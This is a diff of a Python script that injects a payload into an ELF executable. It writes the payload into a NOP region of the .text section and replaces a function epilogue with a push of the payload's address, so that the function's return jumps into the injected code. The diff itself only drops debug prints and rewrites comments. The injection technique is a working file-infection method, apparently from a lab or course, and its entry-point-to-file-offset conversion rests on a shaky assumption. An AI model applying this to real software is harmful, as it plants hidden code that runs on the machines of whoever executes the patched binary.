@@ -3,7 +3,6 @@ import sys
 with open(sys.argv[1], "rb") as f:
     bin_data = bytearray(f.read())
 
-debug = False
 
 """ ------ 1. identify epilogue location and epilogue ------ """
 def findTextSection(bin_data):
@@ -57,7 +56,6 @@ def attemptToFindRet(bin_data, text_addr):
         if currAddr >= endOfFile:
             break
         
-        if debug: print(hex(bin_data[currAddr]))
         result = attemptEpilogue(currAddr-1, bin_data)
 
         if result is False:
@@ -96,37 +94,23 @@ def writePayloadAtNops(bin_data, write_loc, epilogue, payload):
     toInject = bytes(payload) + bytes(epilogue) + bytes([0xC3])
 
     bin_data[write_loc:write_loc+len(toInject)] = toInject
-def writeTrickyJump(bin_data, ret_loc, epilogue_len, jumpTo):
-    """
-    Patch the epilogue with a push <virtual address> + nop padding.
-    jumpTo is given as a file offset; we convert it to a virtual address
-    using the ELF entry point at 0x18-0x1b.
-    """
+def writeTrickyJump(bin_data, ret_loc, epilogue_len, jumpToOffset):
+    # calculate jumpTo
+    entry_bytes = bin_data[0x18:0x1c] # elf header
+    text_base = (entry_bytes[3] << 24) | (entry_bytes[2] << 16) | (entry_bytes[1] << 8) | entry_bytes[0] # full address of .text
+    file_base = text_base & 0xFFFF # full address of file
+    jumpTo = text_base + (jumpToOffset - file_base) 
 
-    # Read entry point (little-endian 4 bytes)
-    entry_bytes = bin_data[0x18:0x1c]
-    text_base = (entry_bytes[3] << 24) | (entry_bytes[2] << 16) | (entry_bytes[1] << 8) | entry_bytes[0]
-
-    # File offset is the low half of text_base
-    text_file_offset = text_base & 0xFFFF
-
-    # Convert file offset to virtual address
-    virt_addr = text_base + (jumpTo - text_file_offset)
-
-    # Build push imm32 (little-endian)
-    patch = [
+    patch = [ # build push command
         0x68,
-        (virt_addr >> 0) & 0xFF,
-        (virt_addr >> 8) & 0xFF,
-        (virt_addr >> 16) & 0xFF,
-        (virt_addr >> 24) & 0xFF,
+        (jumpTo >> 0) & 0xFF,
+        (jumpTo >> 8) & 0xFF,
+        (jumpTo >> 16) & 0xFF,
+        (jumpTo >> 24) & 0xFF,
     ]
+    patch += [0x90] * (epilogue_len - len(patch)) # pad with nops
 
-    # Pad with nops to fill epilogue length
-    patch += [0x90] * (epilogue_len - len(patch))
-
-    # Overwrite epilogue
-    bin_data[ret_loc - epilogue_len: ret_loc] = bytes(patch)
+    bin_data[ret_loc - epilogue_len: ret_loc] = bytes(patch) # overwrite epilogue
 
 
 """ EXECUTE!!!! """
@@ -143,10 +127,8 @@ payload = [
 text_addr = findTextSection(bin_data)
 epilogue_info = attemptToFindRet(bin_data, text_addr)
 epilogue = epilogue_info["epilogue"]
-if debug: print([hex(b) for b in epilogue])
 ret_loc = epilogue_info["location"]
 nop_loc = findSuitableNopAddress(bin_data, text_addr, len(payload))
-
 
 writePayloadAtNops(bin_data, nop_loc, epilogue, payload)
 writeTrickyJump(bin_data, ret_loc, len(epilogue), nop_loc)
